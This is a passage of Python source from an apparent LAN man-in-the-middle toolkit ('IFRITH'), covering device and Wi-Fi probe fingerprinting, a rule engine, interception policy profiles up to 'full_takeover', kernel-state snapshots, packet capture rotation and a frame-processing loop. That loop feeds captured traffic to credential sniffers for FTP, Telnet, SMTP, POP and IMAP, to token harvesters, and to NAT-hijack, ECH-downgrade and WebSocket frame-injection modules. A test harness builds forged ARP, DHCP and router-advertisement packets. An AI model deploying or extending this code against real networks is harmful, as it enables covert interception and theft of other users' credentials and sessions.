        self.tokens.setdefault(h, set()).add(src_ip)
        if len(self.tokens[h]) > 1:
            with STATE.lock:
                STATE.quic_retry.append((time.time(), h,
                                          tuple(self.tokens[h])))
                STATE.dirty += 1

class ProbeRequestFingerprint:
    def __init__(self, iface):
        self.iface = iface
        self.running = False
        self.sock = None
        self.history = defaultdict(set)
    def start(self):
        try:
            self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                                       socket.htons(0x0003))
            self.sock.bind((self.iface, 0))
        except Exception: return False
        self.running = True
        threading.Thread(target=self._loop, daemon=True).start()
        console.log("[green]Probe request fingerprint online[/]")
        return True
    def stop(self):
        self.running = False
        try:
            if self.sock: self.sock.close()
        except Exception: pass
    def _loop(self):
        while self.running and STATE.running:
            try:
                frame = self.sock.recv(65535)
                if len(frame) < 26: continue
                ethertype = struct.unpack("!H", frame[12:14])[0]
                if ethertype != 0x0000: continue
                try:
                    ssid, mac = self._parse_probe(frame)
                    if ssid and mac:
                        self.history[mac].add(ssid)
                        with STATE.lock:
                            STATE.probe_fp.append((time.time(), mac, ssid,
                                                    len(self.history[mac])))
                            STATE.dirty += 1
                except Exception: pass
            except Exception: pass
    def _parse_probe(self, frame):
        try:
            if len(frame) < 36: return None, None
            mac = ":".join(f"{b:02x}" for b in frame[10:16])
            body = frame[24:]
            if len(body) < 12: return None, None
            pos = 0
            while pos + 2 <= len(body):
                eid = body[pos]; elen = body[pos + 1]
                if eid == 0 and 2 + elen <= len(body):
                    raw = body[pos + 2:pos + 2 + elen]
                    try: ssid = raw.decode("utf-8", "replace")
                    except Exception: ssid = ""
                    return (ssid or "<hidden>"), mac
                pos += 2 + elen
        except Exception: pass
        return None, None

class BSSIDTransitionTracer:
    def __init__(self):
        self.running = False
        self.history = defaultdict(deque)
    def start(self):
        self.running = True
        console.log("[green]BSSID transition tracer online[/]")
        return True
    def stop(self): self.running = False
    def observe(self, mac, bssid):
        h = self.history[mac]
        if not h or h[-1][1] != bssid:
            h.append((time.time(), bssid))
            with STATE.lock:
                STATE.bssid_trace.append((time.time(), mac, bssid, len(h)))
                STATE.dirty += 1

class WiFiDirectServiceLookup:
    WIFI_DIRECT_HASHES = {
        "org.wi-fi.wfds.print": "Wi-Fi Direct Print",
        "org.wi-fi.wfds.send":  "Wi-Fi Direct Send",
        "org.wi-fi.wfds.display": "Wi-Fi Direct Display",
        "org.wi-fi.wfds.play":  "Wi-Fi Direct Play",
    }
    def __init__(self): self.running = False
    def start(self):
        self.running = True
        console.log("[green]Wi-Fi Direct lookup online[/]")
        return True
    def stop(self): self.running = False
    def lookup(self, service):
        if not service: return service
        s = service.lower()
        for k, v in self.WIFI_DIRECT_HASHES.items():
            if k in s:
                return v
        return service

class PassiveRouterFingerprint:
    def __init__(self):
        self.running = False
        self.cache = {}
    def start(self):
        self.running = True
        threading.Thread(target=self._loop, daemon=True).start()
        console.log("[green]Passive router fingerprint online[/]")
        return True
    def stop(self): self.running = False
    def _loop(self):
        while self.running and STATE.running:
            time.sleep(30)
            gw = CONFIG.get("gateway_ip")
            if not gw: continue
            try:
                ttl = sh(f"ping -c 1 -W 1 {gw} 2>/dev/null "
                         f"| grep -oP 'ttl=\\K\\d+'")
                if ttl:
                    ttl_val = int(ttl)
                    initial = 64
                    if ttl_val > 64: initial = 128
                    if ttl_val > 128: initial = 255
                    hops = initial - ttl_val
                    fp = {"ttl": ttl_val, "hops": hops, "initial": initial}
                    self.cache[gw] = fp
                    with STATE.lock:
                        STATE.router_fp.append((time.time(), gw, ttl_val,
                                                 hops))
                        STATE.dirty += 1
            except Exception: pass

class RuleEngine:
    def __init__(self):
        self.running = False
        self.rules = []
        self._lock = threading.RLock()
        self.load()
    def load(self):
        try:
            if os.path.exists(CONFIG["rules_file"]):
                with open(CONFIG["rules_file"]) as f:
                    self.rules = json.load(f)
        except Exception: self.rules = []
        if not self.rules:
            self.rules = [
                {"name": "dnsbl_hit", "match": {"kind": "dnsbl"},
                 "action": "log"},
                {"name": "dns_forge", "match": {"kind": "dns_forge"},
                 "action": "log"},
                {"name": "cred_capture", "match": {"kind": "cred"},
                 "action": "log"},
            ]
    def add(self, rule):
        with self._lock:
            self.rules.append(rule)
    def start(self):
        self.running = True
        console.log(f"[green]Rule engine online ({len(self.rules)} rules)[/]")
        return True
    def stop(self): self.running = False
    def evaluate(self, ev):
        with self._lock: rules = list(self.rules)
        for r in rules:
            try:
                if self._match(r, ev):
                    self._act(r, ev)
            except Exception: pass
    def _match(self, r, ev):
        for key, val in (r.get("match") or {}).items():
            if key == "ja4_prefix":
                if str(ev.get("ja4", "")).startswith(val): continue
            if key == "sni_contains":
                if val in str(ev.get("sni", "")): continue
            if key == "kind":
                if str(ev.get("kind", "")) == str(val): continue
            if str(ev.get(key, "")) != str(val):
                return False
        return True
    def _act(self, r, ev):
        action = r.get("action", "log")
        with STATE.lock:
            STATE.rule_hits.append((time.time(), r.get("name", "?"), action,
                                     json.dumps(ev)[:200]))
            STATE.dirty += 1
        if action == "replay" and REPLAY_ENGINE:
            try:
                REPLAY_ENGINE.replay(int(r.get("idx", 0)),
                                      r.get("target", ""))
            except Exception: pass
        if action == "dnsbl_rename" and MDNS_RENAME and ev.get("text"):
            try:
                MDNS_RENAME.rename(str(ev["text"]).split()[0][:60],
                                    "IFRITH-WATCHED")
            except Exception: pass

class PolicyProfileManager:
    PROFILES = ("log_only", "observe_and_enrich", "intercept_passive",
                "intercept_active", "full_takeover")
    def __init__(self):
        self.running = False
        self.policies = {}
        self._lock = threading.RLock()
        self.load()
    def load(self):
        try:
            if os.path.exists(CONFIG["policies_file"]):
                with open(CONFIG["policies_file"]) as f:
                    self.policies = json.load(f)
        except Exception: self.policies = {}
    def save(self):
        try:
            with open(CONFIG["policies_file"], "w") as f:
                json.dump(self.policies, f, indent=2)
        except Exception: pass
    def start(self):
        self.running = True
        console.log(f"[green]Policy manager online "
                     f"({len(self.policies)} policies)[/]")
        return True
    def stop(self): self.save()
    def set(self, mac, profile):
        if profile not in self.PROFILES: return False
        with self._lock:
            self.policies[mac.lower()] = profile
            with STATE.lock:
                STATE.policy_ops.append((time.time(), mac, profile))
                STATE.dirty += 1
        self.save()
        return True
    def get(self, mac):
        return self.policies.get((mac or "").lower(), "observe_and_enrich")

class KernelSnapshot:
    def __init__(self):
        self.running = False
        self.snap = None
    def start(self):
        self.running = True
        console.log("[green]Kernel snapshot online[/]")
        return True
    def stop(self): self.running = False
    def take(self, iface):
        try:
            snap = {}
            try:
                with open("/proc/sys/net/ipv4/ip_forward") as f:
                    snap["ip_forward"] = f.read().strip()
            except Exception: pass
            try:
                with open(f"/proc/sys/net/ipv4/conf/{iface}/rp_filter") as f:
                    snap["rp_filter_iface"] = f.read().strip()
            except Exception: pass
            try:
                with open("/proc/sys/net/ipv4/conf/all/rp_filter") as f:
                    snap["rp_filter_all"] = f.read().strip()
            except Exception: pass
            snap["iptables"] = sh("iptables-save 2>/dev/null | head -500")
            snap["arp_cache"] = sh("ip -4 neigh show 2>/dev/null")
            with open(CONFIG["kernel_snapshot"], "w") as f:
                json.dump(snap, f, indent=2)
            self.snap = snap
            with STATE.lock: STATE.kernel_snap = snap
            return True
        except Exception: return False
    def restore(self):
        if not self.snap:
            try:
                if os.path.exists(CONFIG["kernel_snapshot"]):
                    with open(CONFIG["kernel_snapshot"]) as f:
                        self.snap = json.load(f)
            except Exception: pass
        if not self.snap: return False
        try:
            if "ip_forward" in self.snap:
                sh(f"echo {self.snap['ip_forward']} "
                   f"> /proc/sys/net/ipv4/ip_forward")
            for k in ("rp_filter_iface", "rp_filter_all"):
                if k in self.snap:
                    iface = "all" if k == "rp_filter_all" \
                        else CONFIG.get("iface")
                    path = f"/proc/sys/net/ipv4/conf/{iface}/rp_filter"
                    sh(f"echo {self.snap[k]} > {path}")
            return True
        except Exception: return False

class SignedEventLog:
    def __init__(self):
        self.running = False
        self.path = CONFIG["signed_log"]
        self.head = b"\x00" * 32
        self._lock = threading.RLock()
        self.fp = None
    def start(self):
        self.running = True
        try: self.fp = open(self.path, "a")
        except Exception: self.fp = None
        if os.path.exists(self.path):
            try:
                with open(self.path, "rb") as f:
                    lines = f.readlines()
                    if lines:
                        last = json.loads(lines[-1].decode("utf-8", "ignore"))
                        self.head = bytes.fromhex(last.get("hash",
                                                            "00" * 32))
            except Exception: pass
        console.log(f"[green]Signed event log: {self.path}[/]")
        return True
    def stop(self):
        self.running = False
        try:
            if self.fp: self.fp.close()
        except Exception: pass
    def append(self, entry):
        if not self.fp: return
        with self._lock:
            try:
                payload = json.dumps(entry, default=str).encode()
                h = hashlib.sha256(self.head + payload).digest()
                rec = {"ts": time.time(), "entry": entry,
                        "hash": h.hex(), "prev": self.head.hex()}
                self.fp.write(json.dumps(rec, default=str) + "\n")
                self.fp.flush()
                self.head = h
                with STATE.lock:
                    STATE.log_tail.append((time.time(), h.hex()[:16]))
                    STATE.log_chain_head = h
            except Exception: pass

class StateQueryLanguage:
    def __init__(self):
        self.running = False
    def start(self):
        self.running = True
        console.log("[green]SQL state engine online[/]")
        return True
    def stop(self): self.running = False
    def run(self, sql):
        try:
            conn = sqlite3.connect(":memory:")
            c = conn.cursor()
            c.execute("CREATE TABLE devices(ip TEXT, mac TEXT, vendor TEXT, "
                      "state TEXT, up INT, down INT, ct_gap INT, dnsbl INT, "
                      "mitm INT, http INT, https INT, pinned INT)")
            with STATE.lock:
                devs = list(STATE.devices.values())
            for d in devs:
                c.execute("INSERT INTO devices VALUES(?,?,?,?,?,?,?,?,?,?,?,?)",
                          (d.ip, d.mac, d.vendor, d.state, d.up, d.down,
                           d.ct_gap, d.dnsbl_score,
                           1 if d.mitm else 0,
                           d.proxy_http_flows, d.proxy_https_flows,
                           d.proxy_pinned))
            c.execute("CREATE TABLE flows(src TEXT, sport INT, dst TEXT, "
                      "dport INT, proto TEXT, pkts INT, bytes INT)")
            with STATE.lock:
                flows = list(STATE.flows.items())
            for (s, sp, dd, dp, pr), m in flows:
                c.execute("INSERT INTO flows VALUES(?,?,?,?,?,?,?)",
                          (s, sp, dd, dp, pr, m["pkts"], m["bytes"]))
            c.execute("CREATE TABLE dnsbl(src TEXT, name TEXT, "
                      "matched TEXT, kind TEXT)")
            with STATE.lock:
                hits = list(STATE.dnsbl_hits)
            for ts, src, name, matched, kind in hits:
                c.execute("INSERT INTO dnsbl VALUES(?,?,?,?)",
                          (src, name, matched, kind))
            c.execute("CREATE TABLE mitm(src TEXT, dst TEXT, sni TEXT, "
                      "mode TEXT, bytes_in INT, bytes_out INT)")
            with STATE.lock:
                mflows = list(STATE.mitm_flows)
            for row in mflows:
                try:
                    (ts, src, dst, sp, dp, proto, sni, host, method, path,
                     status, bi, bo, mode, outcome) = row
                    c.execute("INSERT INTO mitm VALUES(?,?,?,?,?,?)",
                              (src, dst, sni, mode, bi, bo))
                except Exception: pass
            c.execute(sql)
            rows = c.fetchall()
            conn.close()
            with STATE.lock:
                STATE.sql_ops.append((time.time(), sql, len(rows)))
                STATE.dirty += 1
            return rows
        except Exception as e:
            with STATE.lock:
                STATE.sql_ops.append((time.time(), sql, f"err: {e}"))
                STATE.dirty += 1
            return None

class LiveMirror:
    def __init__(self):
        self.running = False
        self.sock = None
        self.clients = []
    def start(self):
        try:
            if os.path.exists(CONFIG["mirror_socket"]):
                os.unlink(CONFIG["mirror_socket"])
            self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            self.sock.bind(CONFIG["mirror_socket"])
            self.sock.listen(4); self.sock.settimeout(1.0)
        except Exception as e:
            console.print(f"[yellow]Live mirror failed: {e}[/]")
            return False
        self.running = True
        threading.Thread(target=self._accept_loop, daemon=True).start()
        console.log(f"[green]Live mirror: {CONFIG['mirror_socket']}[/]")
        return True
    def stop(self):
        self.running = False
        try:
            if self.sock: self.sock.close()
        except Exception: pass
        for c in self.clients:
            try: c.close()
            except Exception: pass
    def _accept_loop(self):
        while self.running and STATE.running:
            try: c, _ = self.sock.accept()
            except socket.timeout: continue
            except Exception: break
            c.settimeout(2.0)
            self.clients.append(c)
            with STATE.lock:
                STATE.mirror_ops.append((time.time(), "accept"))
                STATE.dirty += 1
    def push(self, text):
        if not self.running: return
        for c in list(self.clients):
            try: c.sendall(text.encode("utf-8", "ignore") + b"\n")
            except Exception:
                try: c.close()
                except Exception: pass
                if c in self.clients: self.clients.remove(c)

class JA4SFidelityChecker:
    def __init__(self):
        self.running = False
        self.seen = {}
    def start(self):
        self.running = True
        console.log("[green]JA4S fidelity checker online[/]")
        return True
    def stop(self): self.running = False
    def register(self, sni, ja4s_real):
        if not sni or not ja4s_real: return
        self.seen[sni] = ja4s_real
    def check(self, sni, ja4s_ours):
        real = self.seen.get(sni)
        if not real or not ja4s_ours: return
        match = (real == ja4s_ours)
        with STATE.lock:
            STATE.ja4s_fidelity.append((time.time(), sni, real, ja4s_ours,
                                         match))
            STATE.dirty += 1

class CookieScopeGraph:
    def __init__(self):
        self.running = False
        self.graph = defaultdict(set)
        self._lock = threading.RLock()
    def start(self):
        self.running = True
        console.log("[green]Cookie scope graph online[/]")
        return True
    def stop(self): self.running = False
    def observe(self, host, cookie_name):
        with self._lock:
            self.graph[host].add(cookie_name)
            with STATE.lock:
                STATE.cookie_graph[host].add(cookie_name)
                STATE.dirty += 1

class DNSChannelEstimator:
    def __init__(self):
        self.running = False
        self.stats = defaultdict(lambda: {"bytes": 0, "queries": 0,
                                            "first": time.time()})
    def start(self):
        self.running = True
        threading.Thread(target=self._loop, daemon=True).start()
        console.log("[green]DNS channel estimator online[/]")
        return True
    def stop(self): self.running = False
    def observe(self, src_ip, qname, pkt_size):
        s = self.stats[src_ip]
        s["bytes"] += pkt_size
        s["queries"] += 1
    def _loop(self):
        while self.running and STATE.running:
            time.sleep(20)
            now = time.time()
            for ip, s in list(self.stats.items()):
                elapsed = now - s["first"]
                if elapsed > 5 and s["queries"] > 10:
                    bps = (s["bytes"] * 8) / elapsed
                    with STATE.lock:
                        STATE.dns_chan_est.append((now, ip, round(bps, 2),
                                                    s["queries"]))
                        STATE.dirty += 1

class PCAPRotator:
    def __init__(self, iface, ring):
        self.iface = iface; self.ring = ring
        self.running = False
        self.fp = None
        self.written = 0
        self.max_bytes = CONFIG["pcap_rotate_mb"] * 1024 * 1024
        self.index = 0
    def start(self):
        self.running = True
        threading.Thread(target=self._loop, daemon=True).start()
        console.log(f"[green]PCAP rotator online "
                     f"({CONFIG['pcap_rotate_mb']} MB/file)[/]")
        return True
    def stop(self):
        self.running = False
        try:
            if self.fp: self.fp.close()
        except Exception: pass
    def _open(self):
        try:
            path = os.path.join(OUTPUT_DIR, f"ifrith_{self.index:05d}.pcap")
            self.fp = open(path, "wb")
            self.fp.write(struct.pack("<IHHiIII", 0xa1b2c3d4, 2, 4, 0, 0,
                                      65535, 1))
            self.written = 24
        except Exception: self.fp = None
    def _loop(self):
        self._open()
        last_len = 0
        while self.running and STATE.running:
            time.sleep(2)
            try:
                with self.ring.ring_lock:
                    frames = list(self.ring.ring)
                if len(frames) == last_len: continue
                new = frames[last_len:]
                last_len = len(frames)
                for ts, frame in new:
                    if not self.fp: break
                    sec = int(ts); usec = int((ts - sec) * 1_000_000)
                    rec = struct.pack("<IIII", sec, usec, len(frame),
                                       len(frame)) + frame
                    self.fp.write(rec)
                    self.written += len(rec)
                    if self.written >= self.max_bytes:
                        self.fp.close()
                        with STATE.lock:
                            STATE.pcap_rotation.append((time.time(),
                                self.index, self.written))
                            STATE.dirty += 1
                        self.index += 1
                        self._open()
            except Exception: pass

class GuardMonitor:
    def __init__(self, iface):
        self.iface = iface
        self.running = False
        self.baseline_arp = {}
    def start(self):
        self.running = True
        threading.Thread(target=self._loop, daemon=True).start()
        console.log("[green]Guard monitor online[/]")
        return True
    def stop(self): self.running = False
    def _loop(self):
        while self.running and STATE.running:
            time.sleep(30)
            try:
                out = sh("ip -4 neigh show 2>/dev/null")
                for line in out.splitlines():
                    parts = line.split()
                    if len(parts) >= 5 and parts[2] == "lladdr":
                        ip = parts[0]; mac = parts[4].lower()
                        prev = self.baseline_arp.get(ip)
                        if prev and prev != mac:
                            with STATE.lock:
                                STATE.guards.append((time.time(),
                                    f"ARP change {ip}: {prev}->{mac}"))
                                STATE.dirty += 1
                            _emit_event("guard",
                                        f"ARP flip {ip} {prev}->{mac}",
                                        "observed")
                        self.baseline_arp[ip] = mac
            except Exception: pass

class IntentManager:
    def __init__(self):
        self.running = False
        self.history = defaultdict(deque)
    def start(self):
        self.running = True
        console.log("[green]Intent manager online[/]")
        return True
    def stop(self): self.running = False
    def classify(self, device, svc, act, rate):
        act_clean = re.sub(r"\[/?[^\]]+\]", "", act or "").strip()
        if "video call" in act_clean: return "[magenta]real-time comm[/]"
        if "voice call" in act_clean: return "[magenta]real-time comm[/]"
        if "video" in act_clean and "up" in act_clean:
            return "[cyan]publishing[/]"
        if "OS update" in act_clean: return "[yellow]maintenance[/]"
        if "backup" in act_clean: return "[blue]maintenance[/]"
        if "messaging" in act_clean: return "[green]social[/]"
        if "social" in act_clean: return "[green]social[/]"
        if "gaming" in act_clean: return "[blue]recreation[/]"
        if "stream" in act_clean: return "[yellow]consumption[/]"
        if "download" in act_clean: return "[cyan]consumption[/]"
        if "browse" in act_clean: return "[dim]browse[/]"
        if "telemetry" in act_clean: return "[red]background[/]"
        if "remote" in act_clean: return "[cyan]administration[/]"
        if "iot" in act_clean: return "[dim]iot[/]"
        return "[dim]unknown[/]"

class Correlator:
    def __init__(self):
        self.running = False
        self.ja3_map = defaultdict(set)
        self.token_map = defaultdict(set)
    def start(self):
        self.running = True
        console.log("[green]Correlator online[/]")
        return True
    def stop(self): self.running = False
    def observe(self, mac, token, ja3):
        if token:
            self.token_map[token].add(mac)
            if len(self.token_map[token]) > 1:
                with STATE.lock:
                    STATE.correlations.append((time.time(), "token",
                                                token[:16],
                                                tuple(self.token_map[token])))
                    STATE.dirty += 1
        if ja3:
            self.ja3_map[ja3].add(mac)
            if len(self.ja3_map[ja3]) > 1:
                with STATE.lock:
                    STATE.correlations.append((time.time(), "ja3",
                                                ja3[:16],
                                                tuple(self.ja3_map[ja3])))
                    STATE.dirty += 1

class TestHarness:
    def __init__(self, testdata_dir=None):
        self.running = False
        self.testdata_dir = testdata_dir
    def start(self):
        self.running = True
        threading.Thread(target=self._run_tests, daemon=True).start()
        console.log("[green]Test harness online[/]")
        return True
    def stop(self): self.running = False
    def _run_tests(self):
        time.sleep(2)
        tests = [
            ("ja3_vector", self._test_ja3),
            ("ja4_vector", self._test_ja4),
            ("hpack_decode", self._test_hpack),
            ("dns_parse", self._test_dns_parse),
            ("jwt_decode", self._test_jwt),
            ("arp_build", self._test_arp_build),
            ("dhcp_build", self._test_dhcp_build),
            ("ra_build", self._test_ra_build),
        ]
        for name, fn in tests:
            try:
                ok = fn()
            except Exception as e:
                ok = False
                with STATE.lock:
                    STATE.test_results.append((time.time(),
                        f"{name}:err {e}", False))
                    STATE.dirty += 1
                continue
            with STATE.lock:
                STATE.test_results.append((time.time(), name, ok))
                STATE.dirty += 1
    def _test_ja3(self):
        try:
            ja3_str = ("771,4865-4866-4867-49195-49199-49196-49200-52393-52392"
                       "-49171-49172-156-157-47-53,"
                       "0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21,"
                       "29-23-24,0")
            h = hashlib.md5(ja3_str.encode()).hexdigest()
            return len(h) == 32
        except Exception: return False
    def _test_ja4(self):
        try:
            ciphers = sorted(["1301", "1302", "1303", "c02b", "c02f"])
            b = hashlib.sha256(",".join(ciphers).encode()).hexdigest()[:12]
            return len(b) == 12
        except Exception: return False
    def _test_hpack(self):
        try:
            payload = bytes([0x82])
            out = _hpack_decode_py(payload)
            return "GET" in out or ":method" in out
        except Exception: return False
    def _test_dns_parse(self):
        try:
            q = dpkt.dns.DNS(id=0x1234, qr=0, opcode=0,
                             qd=[dpkt.dns.DNS.Q(name="test.com",
                                                 type=1, cls=1)])
            data = bytes(q)
            dns = dpkt.dns.DNS(data)
            return dns.qd and dns.qd[0].name == "test.com"
        except Exception: return False
    def _test_jwt(self):
        try:
            header = base64.urlsafe_b64encode(
                b'{"alg":"HS256"}').rstrip(b"=").decode()
            payload = base64.urlsafe_b64encode(
                b'{"sub":"test","exp":9999999999}').rstrip(b"=").decode()
            sig = "sig"
            tok = f"{header}.{payload}.{sig}"
            j = _decode_jwt(tok)
            return j and j.get("payload", {}).get("sub") == "test"
        except Exception: return False
    def _test_arp_build(self):
        try:
            if not MITM_ENGINE: return True
            frame = MITM_ENGINE._build_arp_reply(
                "aa:bb:cc:dd:ee:ff", "1.1.1.1",
                "11:22:33:44:55:66", "2.2.2.2")
            return len(frame) >= 42
        except Exception: return False
    def _test_dhcp_build(self):
        try:
            r = DHCPUDP.build_dhcp_reply(0x12345678,
                                          b"\xaa\xbb\xcc\xdd\xee\xff",
                                          "192.168.0.100", 2)
            return r is not None and len(r) >= 240
        except Exception: return False
    def _test_ra_build(self):
        try:
            if not MITM_ENGINE: return True
            r = MITM_ENGINE._build_ra("aa:bb:cc:dd:ee:ff", 0)
            return r is not None and len(r) > 20
        except Exception: return False

def _auto_invoke_ws(flow_key, frames):
    try:
        src_ip, sport, dst_ip, dport = flow_key
        for fin, op, payload in frames:
            if op == 0x1 and b"ping" in payload.lower():
                if WS_SPLICE and WS_SPLICE.running:
                    src_mac = CONFIG.get("my_mac")
                    dst = None
                    with STATE.lock:
                        sd = STATE.devices.get(src_ip)
                        if sd and sd.mac != "?": dst = sd.mac
                    if dst and src_mac:
                        WS_SPLICE.inject(CONFIG["iface"], src_mac, dst,
                                          dst_ip, src_ip, dport, sport,
                                          b"pong")
                        with STATE.lock:
                            STATE.auto_invokes.append(
                                (time.time(), "ws_pong", src_ip))
                            STATE.dirty += 1
    except Exception: pass

def process_frame(frame_bytes, ts):
    try: eth = dpkt.ethernet.Ethernet(frame_bytes)
    except Exception: return

    if isinstance(eth.data, dpkt.arp.ARP):
        arp = eth.data
        try:
            ip = socket.inet_ntoa(arp.spa)
            mac = ":".join(f"{b:02x}" for b in arp.sha)
            if mac != "00:00:00:00:00:00" and ip not in RESOLVER_IPS:
                with STATE.lock:
                    d = STATE.devices.get(ip)
                    if d is None:
                        d = Device(ip, mac=mac, vendor=lookup_vendor(mac))
                        STATE.devices[ip] = d
                    elif d.mac == "?":
                        d.mac = mac; d.vendor = lookup_vendor(mac)
                    d.last_seen = time.time()
                    _register_mac(ip, mac)
                    STATE.dirty += 1
        except Exception: pass
        return

    if not isinstance(eth.data, (dpkt.ip.IP, dpkt.ip6.IP6)): return
    ip = eth.data
    try:
        if isinstance(ip, dpkt.ip.IP):
            src_ip = socket.inet_ntoa(ip.src)
            dst_ip = socket.inet_ntoa(ip.dst)
        else:
            src_ip = socket.inet_ntop(socket.AF_INET6, ip.src)
            dst_ip = socket.inet_ntop(socket.AF_INET6, ip.dst)
    except Exception: return
    if src_ip in RESOLVER_IPS and ":" not in dst_ip: return

    size = len(frame_bytes)
    udp_payload = None; udp_sport = udp_dport = 0
    tcp_sport = tcp_dport = 0; tcp_payload = None
    proto_seen = "IP"
    src_mac_hint = None
    if ":" in src_ip and src_ip.lower().startswith("fe80"):
        src_mac_hint = _eui64_to_mac(src_ip)

    my = CONFIG.get("my_ip")
    forwarded = False
    if MITM_ENGINE and MITM_ENGINE.running and my:
        if (src_ip != my and dst_ip != my
            and ":" not in src_ip and ":" not in dst_ip):
            forwarded = True

    with STATE.lock:
        STATE.pkt_count += 1; STATE.byte_count += size
        STATE.dirty += 1
        sd = STATE.devices.get(src_ip)
        if sd is None:
            sd = Device(src_ip, vendor="?")
            STATE.devices[src_ip] = sd
            if src_mac_hint:
                sd.mac = src_mac_hint
                sd.vendor = lookup_vendor(src_mac_hint)
        sd.pkts += 1; sd.bytes += size; sd.up += size
        sd.last_seen = time.time()
        dd = STATE.devices.get(dst_ip)
        if dd is None and dst_ip not in RESOLVER_IPS:
            dd = Device(dst_ip, vendor="?")
            STATE.devices[dst_ip] = dd
        if dd is not None:
            dd.down += size
            dd.last_seen = time.time()

        if isinstance(ip.data, dpkt.tcp.TCP):
            tcp = ip.data
            proto_seen = "TCP"
            tcp_sport, tcp_dport = tcp.sport, tcp.dport
            tcp_payload = tcp.data if tcp.data else None
            key = (src_ip, tcp.sport, dst_ip, tcp.dport, "TCP")
            f = STATE.flows.setdefault(key, {"pkts": 0, "bytes": 0,
                                              "first": ts, "last": ts,
                                              "forwarded": forwarded})
            f["pkts"] += 1; f["bytes"] += size; f["last"] = ts
            if forwarded: f["forwarded"] = True
            sd.ports.add(tcp.dport)
            svc = PORT_SERVICES.get(tcp.dport) or PORT_SERVICES.get(tcp.sport)
            if svc: sd.services.add(svc)
            if TCP_FORK:
                try: TCP_FORK.register(key, tcp.seq, tcp.ack, tcp.win)
                except Exception: pass
            if ISN_PRESERVE:
                try: ISN_PRESERVE.observe(key, tcp.seq)
                except Exception: pass
            if TTL_MIRROR and hasattr(ip, "ttl"):
                try: TTL_MIRROR.learn(dst_ip, ip.ttl, tcp.win)
                except Exception: pass
            if (RECORD_ALIGN and tcp_payload
                and tcp_payload[:1] == b"\x17"):
                try:
                    rec_len = (tcp_payload[3] << 8) | tcp_payload[4]
                    RECORD_ALIGN.observe(f"{src_ip}:{tcp.sport}", "out",
                                          rec_len)
                except Exception: pass
        elif isinstance(ip.data, dpkt.udp.UDP):
            udp = ip.data
            proto_seen = "UDP"
            udp_sport, udp_dport = udp.sport, udp.dport
            udp_payload = udp.data
            key = (src_ip, udp.sport, dst_ip, udp.dport, "UDP")
            f = STATE.flows.setdefault(key, {"pkts": 0, "bytes": 0,
                                              "first": ts, "last": ts,
                                              "forwarded": forwarded})
            f["pkts"] += 1; f["bytes"] += size; f["last"] = ts
            if forwarded: f["forwarded"] = True
            sd.ports.add(udp.dport)
            svc = PORT_SERVICES.get(udp.dport) or PORT_SERVICES.get(udp.sport)
            if svc: sd.services.add(svc)

    if proto_seen == "TCP" and tcp_payload:
        flow_key = (src_ip, tcp_sport, dst_ip, tcp_dport)
        if SNI_DEFRAG:
            try: SNI_DEFRAG.feed(flow_key, tcp_payload)
            except Exception: pass
        is_http_method = any(tcp_payload.startswith(m) for m in HTTP_METHODS)
        if is_http_method or tcp_dport in MITM_PLAINTEXT_PORTS \
                or tcp_sport in MITM_PLAINTEXT_PORTS:
            if HTTP_PARSER:
                direction = "req" if is_http_method else "resp"
                HTTP_PARSER.feed(flow_key, direction, tcp_payload)
        if PROTO_CREDS:
            port = tcp_dport
            if port in (21, 23, 25, 110, 143, 587):
                PROTO_CREDS.feed(flow_key, port, tcp_payload)
        if CRED_SNIFF:
            try: CRED_SNIFF.scan(tcp_payload, src_ip, dst_ip)
            except Exception: pass
        if TOKEN_HARVEST:
            try: TOKEN_HARVEST.scan(tcp_payload, src_ip, dst_ip)
            except Exception: pass
        if (WS_SPLICE and (tcp_dport in (443, 80)
                            or tcp_sport in (443, 80))):
            if tcp_payload[:1] in (b"\x81", b"\x82", b"\x88", b"\x89",
                                    b"\x8a"):
                frames = WS_SPLICE.parse_frames(tcp_payload)
                if frames:
                    WS_SPLICE.register_frames(flow_key, frames)
                    if WS_CTRL:
                        for fin, op, payload in frames:
                            if op in (0x8, 0x9, 0xA):
                                WS_CTRL.observe(flow_key, op, payload)
                    if CONFIG.get("auto_invoke_primitives_enabled"):
                        _auto_invoke_ws(flow_key, frames)
        if H2_HPACK and tcp_payload[:4] == b"PRI ":
            h2 = _parse_h2_settings_py(tcp_payload)
            if h2["frames"]:
                with STATE.lock:
                    STATE.h2_frames.append((time.time(), flow_key,
                                             h2["frames"]))
                    STATE.dirty += 1
                for k, v in h2["settings"].items():
                    H2_HPACK.observe_header(str(tcp_sport), str(k),
                                             f"setting={v}")
                for hdr in h2["headers"][:20]:
                    H2_HPACK.observe_header(str(tcp_sport),
                                             str(random.randint(0, 99)),
                                             hdr)
        if NAT_HIJACK and forwarded:
            try:
                NAT_HIJACK.observe(src_ip, tcp_sport, dst_ip, tcp_dport,
                                    "TCP")
            except Exception: pass

    if (CONFIG.get("sni_enabled", True)
        and proto_seen == "TCP" and tcp_payload is not None
        and (tcp_dport == 443 or tcp_sport == 443)
        and len(tcp_payload) > 5 and tcp_payload[0] == 0x16):
        flow_key = (src_ip, tcp_sport, dst_ip, tcp_dport)
        with STATE.lock:
            already = STATE.sni_seen.get(flow_key)
            if not already:
                STATE.sni_seen[flow_key] = True
        if not already:
            info = _parse_client_hello_py(tcp_payload)
            if (not info.get("sni")) and SNI_DEFRAG:
                info2 = SNI_DEFRAG.try_parse(flow_key)
                if info2 and info2.get("sni"):
                    info = info2
            sni = info.get("sni"); ja3 = info.get("ja3")
            if info.get("ja4"):
                _ja4_on_fp({
                    "stream": hash(flow_key) & 0x7fffffff,
                    "src": src_ip, "dst": dst_ip,
                    "srcport": tcp_sport, "dstport": tcp_dport,
                    "JA4": info.get("ja4"),
                    "ja4_known": info.get("ja4_known"),
                    "ja4_confidence": info.get("ja4_confidence"),
                    "ja4_bot": info.get("ja4_bot"),
                    "ja4_browser": info.get("ja4_browser"),
                    "domain": sni,
                    "hl": "tls", "ts": time.time(),
                }, "ja4")
                if (info.get("ja4_known")
                    and info.get("ja4_confidence") == "high"):
                    with STATE.lock:
                        STATE.ja4_known_hits.append(
                            (time.time(), src_ip, sni,
                             info.get("ja4_known"), info.get("ja4_bot")))
                        STATE.dirty += 1
            if info.get("ech") and ECH_DOWNGRADE:
                ECH_DOWNGRADE.observe(src_ip, dst_ip, sni)
            if info.get("ech") and ECH_OUTER:
                try:
                    ECH_OUTER.observe(src_ip, dst_ip, info.get("alpn"))
                except Exception: pass
            if info.get("psk_binder") and PSK_BINDER:
